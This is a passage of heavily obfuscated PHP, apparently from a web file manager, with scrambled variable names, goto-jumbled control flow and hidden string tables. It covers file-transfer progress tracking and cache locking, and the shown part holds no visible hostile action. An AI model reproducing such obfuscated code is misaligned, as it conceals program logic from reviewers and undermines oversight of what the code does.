Model($A‰é»™ŞÖ[434])->where(array($A‰é»™ŞÖ[93] => $dĞÙ‹ĞÙŒ, $A‰é»™ŞÖ[29] => $A‰é»™ŞÖ[1550]))->delete(); } $bÆç·‡± = json_encode($e‘ëÇµ³‰); goto eŸÎÛÔš±Š; B‰¬ÆÕêâ: Model($A‰é»™ŞÖ[434])->add($cŠİÊË–ğé, array(), !0); goto BÜÎÈ¢Ÿ¥Š; eŸÎÛÔš±Š: if (!$bÆç·‡±) { ob_start(); var_dump($e‘ëÇµ³‰); $a‰ø®ïêĞÜ = ob_get_clean(); self::log($A‰é»™ŞÖ[1551] . json_encode_force($a‰ø®ïêĞÜ)); } if (!$dĞÙ‹ĞÙŒ || !$e‘ëÇµ³‰[$A‰é»™ŞÖ[393]]) { return !1; } $cŠİÊË–ğé = array($A‰é»™ŞÖ[29] => $A‰é»™ŞÖ[1550], $A‰é»™ŞÖ[1529] => USER_ID, $A‰é»™ŞÖ[93] => $dĞÙ‹ĞÙŒ, $A‰é»™ŞÖ[372] => $bÆç·‡±); goto B‰¬ÆÕêâ; BÜÎÈ¢Ÿ¥Š: } public static function log($FÉµ•‰ÀÇ˜) { if (!GLOBAL_DEBUG) { return; } write_log($FÉµ•‰ÀÇ˜, $_SERVER[«¾°Ã¤][1552]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto eˆË™ ‚±Ò; C²Ë×äÕ÷é: Hook::bind($Eóó²§ùí­[1565], array($this, $Eóó²§ùí­[1566])); Hook::bind($Eóó²§ùí­[1567], array($this, $Eóó²§ùí­[1568])); Hook::bind($Eóó²§ùí­[1569], array($this, $Eóó²§ùí­[1570])); goto CÏÌÓºô²â; a„åñœ–: $Eø÷¾šÂâ[$Eóó²§ùí­[1577]] = 0; $Eø÷¾šÂâ[$Eóó²§ùí­[1578]] = 0; if (!$Eø÷¾šÂâ[$Eóó²§ùí­[1434]]) { $Eø÷¾šÂâ[$Eóó²§ùí­[1434]] = LNG($Eóó²§ùí­[1579]); } goto DöÛïµßœò; Dè¬º…ó™¶: Hook::bind($Eóó²§ùí­[579], array($this, $Eóó²§ùí­[1560])); Hook::bind($Eóó²§ùí­[546], array($this, $Eóó²§ùí­[1561])); Hook::bind($Eóó²§ùí­[543], array($this, $Eóó²§ùí­[1561])); goto C‡äõ‹¼‚; A‘Ê‚ˆØŠä: Hook::bind($Eóó²§ùí­[1562], array($this, $Eóó²§ùí­[1563])); Hook::bind($Eóó²§ùí­[568], array($this, $Eóó²§ùí­[1564])); $this->sourceModelCopyFlag = !1; goto C²Ë×äÕ÷é; DœÊğ°ÜÛÉ: $Eø÷¾šÂâ[$Eóó²§ùí­[1024]] = $Eóó²§ùí­[33]; $Eø÷¾šÂâ[$Eóó²§ùí­[1575]] = $Eóó²§ùí­[33]; $Eø÷¾šÂâ[$Eóó²§ùí­[1576]] = 0; goto a„åñœ–; eˆË™ ‚±Ò: $Eóó²§ùí­ =& $_SERVER[«¾°Ã¤]; $Eø÷¾šÂâ =& $this->task; $this->sourceCopyFolder = !1; goto còºõÍ‘èê; B‡’˜©‹·©: Hook::bind($Eóó²§ùí­[575], array($this, $Eóó²§ùí­[1558])); Hook::bind($Eóó²§ùí­[576], array($this, $Eóó²§ùí­[1559])); Hook::bind($Eóó²§ùí­[578], array($this, $Eóó²§ùí­[1560])); goto Dè¬º…ó™¶; CÏÌÓºô²â: $Eø÷¾šÂâ[$Eóó²§ùí­[1571]] = LNG($Eóó²§ùí­[1572]); $Eø÷¾šÂâ[$Eóó²§ùí­[1573]] = 0; $Eø÷¾šÂâ[$Eóó²§ùí­[1574]] = 0; goto DœÊğ°ÜÛÉ; còºõÍ‘èê: Hook::bind($Eóó²§ùí­[1553], array($this, $Eóó²§ùí­[1554])); Hook::bind($Eóó²§ùí­[1111], array($this, $Eóó²§ùí­[1555])); Hook::bind($Eóó²§ùí­[1556], array($this, $Eóó²§ùí­[1557])); goto B‡’˜©‹·©; C‡äõ‹¼‚: Hook::bind($Eóó²§ùí­[548], array($this, $Eóó²§ùí­[1561])); Hook::bind($Eóó²§ùí­[550], array($this, $Eóó²§ùí­[1561])); Hook::bind($Eóó²§ùí­[552], array($this, $Eóó²§ùí­[1561])); goto A‘Ê‚ˆØŠä; DöÛïµßœò: } protected function endAfter() { goto cŠÏ¾Úšó†; Eîôç÷ÉŞ²: Hook::unbind($E¿£‹²Åè¿[1565], array($this, $E¿£‹²Åè¿[1566])); Hook::unbind($E¿£‹²Åè¿[1567], array($this, $E¿£‹²Åè¿[1568])); Hook::unbind($E¿£‹²Åè¿[1569], array($this, $E¿£‹²Åè¿[1570])); goto bá¨Í‹öç; cŠÏ¾Úšó†: $E¿£‹²Åè¿ =& $_SERVER[«¾°Ã¤]; Hook::unbind($E¿£‹²Åè¿[1553], array($this, $E¿£‹²Åè¿[1554])); Hook::unbind($E¿£‹²Åè¿[1111], array($this, $E¿£‹²Åè¿[1555])); goto d¶œº»ïôÚ; fé˜¤×—¼â: Hook::unbind($E¿£‹²Åè¿[578], array($this, $E¿£‹²Åè¿[1560])); Hook::unbind($E¿£‹²Åè¿[579], array($this, $E¿£‹²Åè¿[1560])); Hook::unbind($E¿£‹²Åè¿[546], array($this, $E¿£‹²Åè¿[1561])); goto Bé¶ˆÜè¤¾; Bé¶ˆÜè¤¾: Hook::unbind($E¿£‹²Åè¿[543], array($this, $E¿£‹²Åè¿[1561])); Hook::unbind($E¿£‹²Åè¿[548], array($this, $E¿£‹²Åè¿[1561])); Hook::unbind($E¿£‹²Åè¿[550], array($this, $E¿£‹²Åè¿[1561])); goto fé±ğÏ¹ç¦; d¶œº»ïôÚ: Hook::unbind($E¿£‹²Åè¿[1556], array($this, $E¿£‹²Åè¿[1557])); Hook::unbind($E¿£‹²Åè¿[575], array($this, $E¿£‹²Åè¿[1558])); Hook::unbind($E¿£‹²Åè¿[576], array($this, $E¿£‹²Åè¿[1559])); goto fé˜¤×—¼â; fé±ğÏ¹ç¦: Hook::unbind($E¿£‹²Åè¿[552], array($this, $E¿£‹²Åè¿[1561])); Hook::unbind($E¿£‹²Åè¿[1562], array($this, $E¿£‹²Åè¿[1563])); Hook::unbind($E¿£‹²Åè¿[568], array($this, $E¿£‹²Åè¿[1564])); goto Eîôç÷ÉŞ²; bá¨Í‹öç: } public function copyMoveStart($FĞÂÏ†ÂÃœ, $Föß…‹÷Šù, $fâõ±šæÔ«, $a¸ØÜ„ò¤) { goto cƒøÔŠÒ½ê; cƒøÔŠÒ½ê: $Eƒóåé”Á© =& $_SERVER[«¾°Ã¤]; self::log($Eƒóåé”Á©[1580] . $Föß…‹÷Šù . $Eƒóåé”Á©[67] . $a¸ØÜ„ò¤); $f‡™Éƒé = rtrim(TEMP_FILES, $Eƒóåé”Á©[8]); goto dâÀ„…‡ˆ; d„šæ£öÊ: $a¸ƒŞá­™[$Eƒóåé”Á©[1581]] = KodIO::transferType($FĞÂÏ†ÂÃœ, $fâõ±šæÔ«); $this->update(); goto BÆŒ…¯ØË; dâÀ„…‡ˆ: if (substr($Föß…‹÷Šù, 0, strlen($f‡™Éƒé)) == $f‡™Éƒé) { return; } if (substr($a¸ØÜ„ò¤, 0, strlen($f‡™Éƒé)) == $f‡™Éƒé) { return; } $a¸ƒŞá­™ =& $this->task; goto d„šæ£öÊ; BÆŒ…¯ØË: } public function updateAfter() { goto DÛ¶Öñ°˜¨; Cæ³Ú¯Ë—: if ($this->sourceModelCopyFlag) { return; } if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1581]] == $eìª‘¥÷æĞ[1184]) { return; } if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1581]] == $eìª‘¥÷æĞ[1095] || $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1581]] == $eìª‘¥÷æĞ[107]) { if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1575]]) { $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1578]] = $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1577]] + $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1574]]; } } else { if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1581]] == $eìª‘¥÷æĞ[1185]) { if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1575]] == $eìª‘¥÷æĞ[1095]) { $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1578]] = $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1577]] + $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1574]] * 0.5; } else { if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1575]] == $eìª‘¥÷æĞ[107]) { $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1578]] = $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1577]] + $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1573]] * 0.5 + $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1574]] * 0.5; } } } } goto aå©Šğ‚±Â; aå©Šğ‚±Â: $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1530]] = $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1578]] / $cÀ«©Â¤¨[$eìª‘¥÷æĞ[732]]; if ($cÀ«©Â¤¨[$eìª‘¥÷æĞ[1530]] > 0) { $b“Ÿ¶Åñ¾ä = timeFloat() - $cÀ«©Â¤¨[$eìª‘¥÷æĞ[758]] - $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1533]]; $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1534]] = $b“Ÿ¶Åñ¾ä * (1 - $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1530]]) / $cÀ«©Â¤¨[$eìª‘¥÷æĞ[1530]]; } goto EÛ¬»îá£Ö; DÛ¶Öñ°˜¨: $eìª‘¥÷æĞ =& $_SERVER[«¾°Ã¤]; $cÀ«©Â¤¨ =& $this->task; if (!$cÀ«©Â¤¨[$eìª‘¥÷æĞ[732]]) { return; } goto Cæ³Ú¯Ë—; EÛ¬»îá£Ö: } public function addPath($D¥‹ë’ì„‘) { goto e†ˆêëáÒ¯; e†ˆêëáÒ¯: $f¨ ÙÂÂ‡ =& $_SERVER[«¾°Ã¤]; if (!$D¥‹ë’ì„‘) { return; } $D•„Í±ÓÀŞ =& $this->task; goto a×®Øò¾‡Î; cˆëùšœ: if ($FİÈËã•Ì[$f¨ ÙÂÂ‡[29]] == $f¨ ÙÂÂ‡[193]) { $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1022]] += 1; } else { $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1022]] += $FİÈËã•Ì[$f¨ ÙÂÂ‡[81]][$f¨ ÙÂÂ‡[79]]; if ($FİÈËã•Ì[$f¨ ÙÂÂ‡[404]]) { $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1022]] += $FİÈËã•Ì[$f¨ ÙÂÂ‡[81]][$f¨ ÙÂÂ‡[80]] + 1; } } $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[732]] += $FİÈËã•Ì[$f¨ ÙÂÂ‡[78]]; $this->update(); goto bƒìàÆÚ›ª; a×®Øò¾‡Î: $FİÈËã•Ì = IO::infoWithChildren($D¥‹ë’ì„‘); $D¦öÂ¶»Ù‘ = $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1582]] ? $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1582]][$f¨ ÙÂÂ‡[1583]] : 0; $D•„Í±ÓÀŞ[$f¨ ÙÂÂ‡[1582]] = array($f¨ ÙÂÂ‡[1583] => $D¦öÂ¶»Ù‘ + 1, $f¨ ÙÂÂ‡[422] => $FİÈËã•Ì[$f¨ ÙÂÂ‡[28]], $f¨ ÙÂÂ‡[76] => $FİÈËã•Ì[$f¨ ÙÂÂ‡[76]], $f¨ ÙÂÂ‡[504] => $FİÈËã•Ì[$f¨ ÙÂÂ‡[504]] ? $FİÈËã•Ì[$f¨ ÙÂÂ‡[504]] : $FİÈËã•Ì[$f¨ ÙÂÂ‡[76]]); goto cˆëùšœ; bƒìàÆÚ›ª: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dë´–‡êÇš) { $Bï‘«‹ç”• =& $_SERVER[«¾°Ã¤]; $e÷ï¬òËÏŒ =& $this->task; $e÷ï¬òËÏŒ[$Bï‘«‹ç”•[1571]] = $dë´–‡êÇš[$Bï‘«‹ç”•[28]]; $e÷ï¬òËÏŒ[$Bï‘«‹ç”•[1024]] = $dë´–‡êÇš[$Bï‘«‹ç”•[28]]; $this->update(); } public function copyFileStart($bœùè¿²ßÕ, $e…®˜ƒàÖ°, $AòôÇªÆ‰†, $dÊƒ„óµˆ, $d”ˆçì¿, $D¨ë¯Ø²ë) { goto c–ØìŞÈäÀ; f¯åä“õ¨‡: $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1571]] = $aÑìÚ´àĞ; $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1573]] = (int) $bœùè¿²ßÕ->size($e…®˜ƒàÖ°); $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1574]] = 0; goto Eß‘ĞÈÍè§; Eñä–êåİÛ: $GLOBALS[$d÷·Ô´ É†[1585]] = $d”ˆçì¿; $GLOBALS[$d÷·Ô´ É†[1584]] = $D¨ë¯Ø²ë; $DÁ¨Š¡³åŞ =& $this->task; goto f¯åä“õ¨‡; Eß‘ĞÈÍè§: $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1024]] = $d÷·Ô´ É†[33]; $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1575]] = $d÷·Ô´ É†[33]; $DÁ¨Š¡³åŞ[$d÷·Ô´ É†[1576]] = 0; goto ašÏ‚ÊŒİ‚; c–ØìŞÈäÀ: $d÷·Ô´ É† =& $_SERVER[«¾°Ã¤]; $aÑìÚ´àĞ = $d”ˆçì¿; if ($aÑìÚ´àĞ == $GLOBALS[$d÷·Ô´ É†[1584]]) { $aÑìÚ´àĞ = $GLOBALS[$d÷·Ô´ É†[1585]]; } goto Eñä–êåİÛ; ašÏ‚ÊŒİ‚: $this->update(); goto CÔµÓ¶êÔÄ; CÔµÓ¶êÔÄ: } public function copyFileEnd($Dƒ†ÊÁ†˜Ø, $bøÚª‘µ„™, $fø¸Şö…£, $b¬¹Òù‘îŸ, $Eá¹”µš’¨, $bĞ¼Õ„·Ñ¼) { $c™›†ÀŞâ =& $_SERVER[«¾°Ã¤]; $aÆÁœ°™åŞ =& $this->task; $aÆÁœ°™åŞ[$c™›†ÀŞâ[1574]] = $aÆÁœ°™åŞ[$c™›†ÀŞâ[1573]]; $aÆÁœ°™åŞ[$c™›†ÀŞâ[1575]] = $c™›†ÀŞâ[33]; if ($Eá¹”µš’¨ == $aÆÁœ°™åŞ[$c™›†ÀŞâ[1571]]) { $aÆÁœ°™åŞ[$c™›†ÀŞâ[1577]] += $aÆÁœ°™åŞ[$c™›†ÀŞâ[1573]]; $aÆÁœ°™åŞ[$c™›†ÀŞâ[1578]] = $aÆÁœ°™åŞ[$c™›†ÀŞâ[1577]]; $this->update(1); } else { $this->update(); $aÆÁœ°™åŞ[$c™›†ÀŞâ[1574]] = 0; } self::log($c™›†ÀŞâ[1586] . $bøÚª‘µ„™ . $c™›†ÀŞâ[67] . $b¬¹Òù‘îŸ . $c™›†ÀŞâ[229] . $Eá¹”µš’¨ . $c™›†ÀŞâ[1587] . $aÆÁœ°™åŞ[$c™›†ÀŞâ[1571]]); } public function updateFileEnd($Dº­Í¸†¤ß, $fğè”„Œ¡²) { goto FäÜ Û™ŠË; FäÜ Û™ŠË: $aíà‘ÕÅëë =& $_SERVER[«¾°Ã¤]; $DŒ§½ÒĞÒ =& $this->task; $DŒ§½ÒĞÒ[$aíà‘ÕÅëë[1571]] = $Dº­Í¸†¤ß; goto d£ç£‚Ö; Cëæ¼¡ªĞ®: $this->update(1); self::log($aíà‘ÕÅëë[1588] . $Dº­Í¸†¤ß); goto bàÃ„Ê†Æó; d£ç£‚Ö: $DŒ§½ÒĞÒ[$aíà‘ÕÅëë[1573]] = $fğè”„Œ¡²; $DŒ§½ÒĞÒ[$aíà‘ÕÅëë[1577]] += $fğè”„Œ¡²; $DŒ§½ÒĞÒ[$aíà‘ÕÅëë[1578]] = $DŒ§½ÒĞÒ[$aíà‘ÕÅëë[1577]]; goto Cëæ¼¡ªĞ®; bàÃ„Ê†Æó: } public function sourceModelCopy($bå–ÙÈò’ğ) { goto aÚ¬‰À¤Ìì; EÜ©¸·ŒØ: switch ($Eååæ ê‹) { case $c—ò‚ ½¶[544]: $böº„Ğ‡Å = 1; break; case $c—ò‚ ½¶[547]: $CğÖÖ‡Ì“Œ[$c—ò‚ ½¶[1571]] = $C×¹âáŒ˜µ[$c—ò‚ ½¶[28]]; break; case $c—ò‚ ½¶[549]: $böº„Ğ‡Å = intval($bå–ÙÈò’ğ[$c—ò‚ ½¶[377]] * 0.4); break; case $c—ò‚ ½¶[551]: $böº„Ğ‡Å = intval($bå–ÙÈò’ğ[$c—ò‚ ½¶[377]] * 0.2); break; case $c—ò‚ ½¶[553]: $böº„Ğ‡Å = intval($bå–ÙÈò’ğ[$c—ò‚ ½¶[377]] * 0.4); break; } $this->update($böº„Ğ‡Å); $this->sourceModelCopyFlag = !1; goto d¡±‹½ÀÆ¼; e¤ÄÚÊã²: $CğÖÖ‡Ì“Œ =& $this->task; $this->sourceModelCopyFlag = !0; $böº„Ğ‡Å = 0; goto EÜ©¸·ŒØ; aÚ¬‰À¤Ìì: $c—ò‚ ½¶ =& $_SERVER[«¾°Ã¤]; $Eååæ ê‹ = $bå–ÙÈò’ğ[0]; $C×¹âáŒ˜µ = $bå–ÙÈò’ğ[1]; goto e¤ÄÚÊã²; d¡±‹½ÀÆ¼: } public function sourceRemove($eÅ‡İÍåÊæ, $cËĞÛÍòä) { $dïœ­Äˆå =& $_SERVER[«¾°Ã¤]; $this->sourceModelCopyFlag = !0; $fÇÁù¯Ê× = 1; if (isset($eÅ‡İÍåÊæ[$dïœ­Äˆå[81]])) { $fÇÁù¯Ê× = $eÅ‡İÍåÊæ[$dïœ­Äˆå[81]][$dïœ­Äˆå[79]] + $eÅ‡İÍåÊæ[$dïœ­Äˆå[81]][$dïœ­Äˆå[80]] + 1; } $this->update($fÇÁù¯Ê×); $this->sourceModelCopyFlag = !1; } public function sourceMove($b÷‚›Â) { $this->sourceRemove($b÷‚›Â, !1); } public function curlProgress($Eåí¯Òõ©è, $c¶«¡ùàâ‰, $C’À†ŸÛç, $BîòÚŞÛ, $c»÷ò·‹š) { $dõ„‰ŠŞ‚Ó =& $_SERVER[«¾°Ã¤]; $c•†øóË¾ =& $this->task; if ($c»÷ò·‹š > 0) { $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1024]] = $dõ„‰ŠŞ‚Ó[1589]; $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1575]] = $dõ„‰ŠŞ‚Ó[107]; if ($c•†øóË¾[$dõ„‰ŠŞ‚Ó[1573]]) { $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1574]] = $c»÷ò·‹š; } if ($c•†øóË¾[$dõ„‰ŠŞ‚Ó[1576]]) { $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1574]] = $c»÷ò·‹š + $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1576]]; } } else { if ($C’À†ŸÛç > 0) { if ($c•†øóË¾[$dõ„‰ŠŞ‚Ó[1573]] == $c¶«¡ùàâ‰) { $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1574]] = $C’À†ŸÛç; $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1024]] = $dõ„‰ŠŞ‚Ó[1590]; $c•†øóË¾[$dõ„‰ŠŞ‚Ó[1575]] = $dõ„‰ŠŞ‚Ó[1095]; } } } $this->update(); } public function curlProgressStart($FÕ®Û±¦ö) { } public function curlProgressEnd($B£ø¿Ô„×) { goto fã”ƒ£ÜÈ; fã”ƒ£ÜÈ: $dœÓø‰ç»Ú =& $_SERVER[«¾°Ã¤]; $föµ¯­‡¬ =& $this->task; $cˆ¼÷‰í®ê = curl_getinfo($B£ø¿Ô„×); goto cï­ìéŞ; Aƒ»Œ ‘: $this->update(); goto AÔ«À·ËÊ²; cï­ìéŞ: $Dƒ¿³”ö = $cˆ¼÷‰í®ê[$dœÓø‰ç»Ú[1591]]; if ($Dƒ¿³”ö == -1) { $Dƒ¿³”ö = $cˆ¼÷‰í®ê[$dœÓø‰ç»Ú[1592]]; } if ($föµ¯­‡¬[$dœÓø‰ç»Ú[1575]] == $dœÓø‰ç»Ú[107] && $Dƒ¿³”ö) { $föµ¯­‡¬[$dœÓø‰ç»Ú[1576]] += $Dƒ¿³”ö; } goto Aƒ»Œ ‘; AÔ«À·ËÊ²: } } goto FÖˆ«®òƒˆ; Cóºí¹ßâ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto AƒÎ‚–˜éÔ; bÙè‹Ğ•†²: self::$timeout = $BÌŸÇöŒºŞ[$e«ğ’œ¹İ[814]] ? $BÌŸÇöŒºŞ[$e«ğ’œ¹İ[814]] : 10; $C…ÛÕãğ = _get($GLOBALS[$e«ğ’œ¹İ[6]], $e«ğ’œ¹İ[815]); $DµÎ°À¢½ë = $BÌŸÇöŒºŞ[$e«ğ’œ¹İ[801]] ? $BÌŸÇöŒºŞ[$e«ğ’œ¹İ[801]] : $e«ğ’œ¹İ[193]; goto fò²âµÛ··; fò²âµÛ··: if ($DµÎ°À¢½ë == $e«ğ’œ¹İ[17] && $C…ÛÕãğ == $e«ğ’œ¹İ[9]) { $DµÎ°À¢½ë = $e«ğ’œ¹İ[193]; } switch ($DµÎ°À¢½ë) { case $e«ğ’œ¹İ[804]: self::$handle = new CacheLockRedis(); break; case $e«ğ’œ¹İ[805]: self::$handle = new CacheLockMemcached(); break; case $e«ğ’œ¹İ[17]: self::$handle = new CacheLockDatabase(); break; case $e«ğ’œ¹İ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto cÏŠ­Ğ¡åï; AƒÎ‚–˜éÔ: $e«ğ’œ¹İ =& $_SERVER[«¾°Ã¤]; if (self::$handle) { return self::$handle; } $BÌŸÇöŒºŞ = $GLOBALS[$e«ğ’œ¹İ[6]][$e«ğ’œ¹İ[347]]; goto bÙè‹Ğ•†²; cÏŠ­Ğ¡åï: } private static function key($FÕƒˆÒÖ­“) { return $_SERVER[«¾°Ã¤][816] . Cache::key($FÕƒˆÒÖ­“); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BÄâ˜¯“å§ = '') { self::$errorMsg = $BÄâ˜¯“å§; } public static function lockGlobal($e¼œõ«ò‘, $B” çëëØš) { return self::lock($e¼œõ«ò‘, $B” çëëØš, !0); } public static function lock($e‰ÃÓëÍ—Ê, $DÂ­·‡«¸ê = false, $bÀÙæÊ ¤” = false) { goto CÛãŠÒÉ¥õ; F˜Â¹‰øšŒ: $DÂ­·‡«¸ê = $DÂ­·‡«¸ê ? $DÂ­·‡«¸ê : self::$timeout; $CË’İ±É´ó = $D®Ï´Äéáâ->lock($aàõèÀĞªî, $DÂ­·‡«¸ê); if (!$CË’İ±É´ó) { $aÍ¡œÒºÔ± = "\154\157\143\153\40\145\162\x72\157\x72\73\x6b\145\x79\75{$e‰ÃÓëÍ—Ê}\73\164\151\155\145\75{$DÂ­·‡«¸ê}\73" . self::$errorMsg . $EîÀ¯èÑ™[68] . get_caller_msg(); $C¯ÖèŠãó = LNG($EîÀ¯èÑ™[817]) . "\x28{$DÂ­·‡«¸ê}\x73\x29\x2e" . LNG($EîÀ¯èÑ™[818]); $C¯ÖèŠãó .= $EîÀ¯èÑ™[819]; if (is_string(self::$errorMsg) && self::$errorMsg) { $C¯ÖèŠãó = $C¯ÖèŠãó . $EîÀ¯èÑ™[820] . self::$errorMsg; } write_log($aÍ¡œÒºÔ±, $EîÀ¯èÑ™[821]); show_json($C¯ÖèŠãó, !1); } goto EÜÎéåÈğê; EÜÎéåÈğê: if (!$bÀÙæÊ ¤”) { self::$lockItem[$aàõèÀĞªî] = !0; } return $CË’İ±É´ó; goto Bì†Œ¡§à; CÛãŠÒÉ¥õ: $EîÀ¯èÑ™ =& $_SERVER[«¾°Ã¤]; $D®Ï´Äéáâ = self::init(); $aàõèÀĞªî = self::key($e‰ÃÓëÍ—Ê); goto F˜Â¹‰øšŒ; Bì†Œ¡§à: } public static function lockGet($aô¨Í•Úé) { $fµŸõÂºÁ¼ = self::key($aô¨Í•Úé); if (self::$lockItem[$fµŸõÂºÁ¼]) { return self::$lockItem[$fµŸõÂºÁ¼]; } return self::init()->lockGet($fµŸõÂºÁ¼); } public static function unlock($A¶ßİô®Í) { $Bàƒ„óĞÂ = self::key($A¶ßİô®Í); self::$lockItem[$Bàƒ„óĞÂ] = null; return self::init()->unlock($Bàƒ„óĞÂ); } public static function unlockRuntime() { $bÆ•ä‚ô‡è =& $_SERVER[«¾°Ã¤]; $DÙµöÀñä÷ = self::init(); $Côäô—ì—¼ = !1; foreach (self::$lockItem as $B¬²šÄÆÈÍ => $cˆÂ£ƒ’™Ã) { if (!$cˆÂ£ƒ’™Ã) { continue; } $DÙµöÀñä÷->unlock($B¬²šÄÆÈÍ); if (!$Côäô—ì—¼) { $Côäô—ì—¼ = !0; write_log($bÆ•ä‚ô‡è[822] . $B¬²šÄÆÈÍ . $bÆ•ä‚ô‡è[68] . get_caller_msg(), $bÆ•ä‚ô‡è[821]); continue; } write_log($bÆ•ä‚ô‡è[822] . $B¬²šÄÆÈÍ, $bÆ•ä‚ô‡è[821]); } self::fileUnlockAll(); } public static function fileLock($b®òÉåğ‘) { goto Eõ”ÆĞ¼ŒŞ; bã‚‘Ò§™½: $DÈç§ÑŠ÷« = fopen(DATA_PATH . $b®òÉåğ‘ . $bŸë‚çôóÄ[824], $bŸë‚çôóÄ[825]); if (!$DÈç§ÑŠ÷«) { return !1; } $GLOBALS[$bŸë‚çôóÄ[823]][$b®òÉåğ‘] = $DÈç§ÑŠ÷«; goto FœÇëˆİÑÜ; B‡Ë´ƒÏ¶ì: return !1; goto AˆÃî¡¥è­; FœÇëˆİÑÜ: if (flock($DÈç§ÑŠ÷«, LOCK_EX)) { return !0; } self::unlock($b®òÉåğ‘); show_json($bŸë‚çôóÄ[826], !1); goto B‡Ë´ƒÏ¶ì; Eõ”ÆĞ¼ŒŞ: $bŸë‚çôóÄ =& $_SERVER[«¾°Ã¤]; if (!$GLOBALS[$bŸë‚çôóÄ[823]]) { $GLOBALS[$bŸë‚çôóÄ[823]] = array(); } $GLOBALS[$bŸë‚çôóÄ[823]][$b®òÉåğ‘] = !1; goto bã‚‘Ò§™½; AˆÃî¡¥è­: } public static function fileUnlock($b¦°ĞÖôÔ) { $F÷ÏôôîäÀ =& $_SERVER[«¾°Ã¤]; $Cç½’†×¢˜ = $GLOBALS[$F÷ÏôôîäÀ[823]][$b¦°ĞÖôÔ]; if (!$Cç½’†×¢˜) { return; } $GLOBALS[$F÷ÏôôîäÀ[823]][$b¦°ĞÖôÔ] = !1; flock($Cç½’†×¢˜, LOCK_UN); fclose($Cç½’†×¢˜); } public static function fileUnlockAll() { $dÆÚ¨Ş³ƒ =& $_SERVER[«¾°Ã¤]; if (!$GLOBALS[$dÆÚ¨Ş³ƒ[823]]) { return; } foreach ($GLOBALS[$dÆÚ¨Ş³ƒ[823]] as $B¯è¬Ç÷ã• => $fµíƒ«¥×) { if (!$fµíƒ«¥×) { continue; } $GLOBALS[$dÆÚ¨Ş³ƒ[823]][$B¯è¬Ç÷ã•] = !1; flock($fµíƒ«¥×, LOCK_UN); fclose($fµíƒ«¥×); } $GLOBALS[$dÆÚ¨Ş³ƒ[823]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $FôºÀ¶¢ˆƒ =& $_SERVER[«¾°Ã¤]; $Böß‚¦šø = $GLOBALS[$FôºÀ¶¢ˆƒ[6]][$FôºÀ¶¢ˆƒ[347]]; self::$cachePath = $Böß‚¦šø[$FôºÀ¶¢ˆƒ[193]][$FôºÀ¶¢ˆƒ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e’İ§ğ¿÷À, $E¡œÚº…£ï = 0) { goto AøŠ—Ãè‘Â; D³„ øÍƒ: $CŠÑ»®å = rtrim(self::$cachePath, $D‡°‹ãÚŒ[8]) . $D‡°‹ãÚŒ[827] . md5($e’İ§ğ¿÷À) . $D‡°‹ãÚŒ[824]; if (file_exists($CŠÑ»®å) && filemtime($CŠÑ»®å) && filemtime($CŠÑ»®å) < time() - 10) { @unlink($CŠÑ»®å); } do { if (file_exists($CŠÑ»®å)) { cacheLockWait(); continue; } $D“Ä˜ˆªî = fopen($CŠÑ»®å, $D‡°‹ãÚŒ[828]); if (!$D“Ä˜ˆªî) { return !1; } $cœ¿ïŸô¿æ = flock($D“Ä˜ˆªî, LOCK_EX | LOCK_NB); self::$caches[$e’İ§ğ¿÷À] = array($D‡°‹ãÚŒ[829] => $D“Ä˜ˆªî, $D‡°‹ãÚŒ[193] => $CŠÑ»®å); fwrite($D“Ä˜ˆªî, $Aæ˜¯š”ôâ); clearstatcache(); if ($D“Ä˜ˆªî && $cœ¿ïŸô¿æ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Aæ˜¯š”ôâ); goto BèÚÌëôì¡; BèÚÌëôì¡: $this->unlock($e’İ§ğ¿÷À); return !1; goto B™á¥¸İùê; AøŠ—Ãè‘Â: $D‡°‹ãÚŒ =& $_SERVER[«¾°Ã¤]; 